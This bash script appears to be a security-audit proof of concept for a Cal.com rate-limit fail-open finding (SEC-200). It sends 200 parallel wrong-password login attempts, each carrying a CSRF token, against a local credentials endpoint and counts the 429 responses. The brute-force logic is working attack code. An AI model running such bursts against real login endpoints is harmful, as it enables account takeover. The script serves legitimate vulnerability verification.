#!/usr/bin/env bash
# PoC SEC-200 — rate-limit fail-open when UNKEY_ROOT_KEY is absent.
#
# Hypothesis: packages/lib/rateLimit.ts:33-42 — if UNKEY_ROOT_KEY is unset,
# every call to `checkRateLimitAndThrowError()` returns `{ success: true }`.
# Brute-force on /api/auth/callback/credentials should therefore be unrestricted.
#
# Flow:
#   1. Check the dev env: is UNKEY_ROOT_KEY set?
#   2. Fire 200 sequential-ish bad-password attempts against pro@example.com.
#   3. Count HTTP responses by status code.
#   4. Look at the headers of one attempt for X-RateLimit-* signal.
#
# Vulnerability is confirmed when:
#   - UNKEY_ROOT_KEY is empty/unset, AND
#   - 0 of the 200 requests received HTTP 429.
#
# Usage:
#   yarn workspace @calcom/web dev   # in another terminal
#   bash scripts/audit-poc/poc-sec-200.sh
#
# Env overrides:
#   CAL_BASE_URL    default http://localhost:3000
#   TARGET_EMAIL    default pro@example.com
#   TOTAL           default 200
#   PARALLELISM     default 20

set -u

BASE="${CAL_BASE_URL:-http://localhost:3000}"
TARGET_EMAIL="${TARGET_EMAIL:-pro@example.com}"
TOTAL="${TOTAL:-200}"
PARALLELISM="${PARALLELISM:-20}"

echo "=== PoC SEC-200 — rate-limit fail-open ==="
echo "base   = ${BASE}"
echo "target = ${TARGET_EMAIL}"
echo "shots  = ${TOTAL} (parallel ${PARALLELISM})"

# --- 1. inspect .env for UNKEY_ROOT_KEY ----------------------------------
unkey_set=""
for f in .env .env.local; do
  if [ -f "${f}" ] && grep -E '^UNKEY_ROOT_KEY=' "${f}" | grep -v 'UNKEY_ROOT_KEY=$\|UNKEY_ROOT_KEY=""\|UNKEY_ROOT_KEY=" "' >/dev/null; then
    unkey_set="${f}"
    break
  fi
done
if [ -n "${unkey_set}" ]; then
  echo "[!] UNKEY_ROOT_KEY appears set in ${unkey_set}. The fail-open finding"
  echo "    only triggers when the var is absent. Continuing anyway — the"
  echo "    rate-limit *should* now kick in. If it does not, that's a separate"
  echo "    issue (Unkey unreachable, timeout fallback, etc.)."
else
  echo "[i] UNKEY_ROOT_KEY not set in .env / .env.local — fail-open path expected."
fi
echo ""

# --- 2. fetch a CSRF token + cookie --------------------------------------
csrf_jar="$(mktemp)"
trap 'rm -f "${csrf_jar}"' EXIT
csrf_token="$(curl -sS -c "${csrf_jar}" "${BASE}/api/auth/csrf" | jq -r .csrfToken)"
if [ -z "${csrf_token}" ] || [ "${csrf_token}" = "null" ]; then
  echo "[ERROR] failed to fetch csrfToken from ${BASE}/api/auth/csrf"
  exit 3
fi
echo "[i] csrfToken acquired (${#csrf_token} chars)"

# --- 3. one canary request — capture headers -----------------------------
canary_out="$(mktemp)"
canary_status="$(curl -sS -o "${canary_out}" -w '%{http_code}' \
  -D - \
  -b "${csrf_jar}" \
  -X POST "${BASE}/api/auth/callback/credentials" \
  -H "content-type: application/x-www-form-urlencoded" \
  --data-urlencode "csrfToken=${csrf_token}" \
  --data-urlencode "email=${TARGET_EMAIL}" \
  --data-urlencode "password=wrong-canary" \
  --data-urlencode "redirect=false" \
  --data-urlencode "json=true" \
  --data-urlencode "callbackUrl=${BASE}" 2>&1 | tee /tmp/poc-sec-200-canary.txt | tail -c 4)"
echo "[i] canary status: ${canary_status}"
echo "[i] rate-limit response headers (if any):"
grep -iE '^(X-RateLimit|RateLimit|Retry-After):' /tmp/poc-sec-200-canary.txt | sed 's/^/    /' || echo "    (none)"
rm -f "${canary_out}"
echo ""

# --- 4. brute-force burst ------------------------------------------------
results="$(mktemp)"
trap 'rm -f "${csrf_jar}" "${results}"' EXIT

attempt() {
  local i="$1"
  local code
  code="$(curl -sS -o /dev/null -w '%{http_code}' \
    -b "${csrf_jar}" \
    -X POST "${BASE}/api/auth/callback/credentials" \
    -H "content-type: application/x-www-form-urlencoded" \
    --data-urlencode "csrfToken=${csrf_token}" \
    --data-urlencode "email=${TARGET_EMAIL}" \
    --data-urlencode "password=wrong-${i}" \
    --data-urlencode "redirect=false" \
    --data-urlencode "json=true" \
    --data-urlencode "callbackUrl=${BASE}" 2>/dev/null)"
  echo "${code}"
}

export -f attempt
export BASE TARGET_EMAIL csrf_jar csrf_token

echo "[i] firing ${TOTAL} requests with parallelism ${PARALLELISM}…"
start="$(date +%s)"
seq 1 "${TOTAL}" | xargs -I{} -P "${PARALLELISM}" -n 1 bash -c 'attempt "$@"' _ {} >"${results}"
elapsed="$(( $(date +%s) - start ))"

# --- 5. tally ------------------------------------------------------------
echo ""
echo "[i] elapsed: ${elapsed}s"
echo "[i] response distribution:"
sort "${results}" | uniq -c | sort -nr | sed 's/^/    /'

c429="$(grep -c '^429$' "${results}" || true)"
c401="$(grep -c '^401$' "${results}" || true)"
c302="$(grep -c '^302$' "${results}" || true)"
c200="$(grep -c '^200$' "${results}" || true)"
other_total=$(( TOTAL - c429 - c401 - c302 - c200 ))
echo ""

# Verdict ----------------------------------------------------------------
if [ "${c429}" = "0" ]; then
  echo "[VULN CONFIRMED] ${TOTAL}/${TOTAL} requests passed, 0 rate-limited"
  echo "                 (200=${c200} 302=${c302} 401=${c401} other=${other_total})"
  echo "                 → packages/lib/rateLimit.ts fail-open active"
  exit 1
fi
echo "[MITIGATED] ${c429}/${TOTAL} requests rate-limited (429)"
echo "             (200=${c200} 302=${c302} 401=${c401} 429=${c429} other=${other_total})"
exit 0
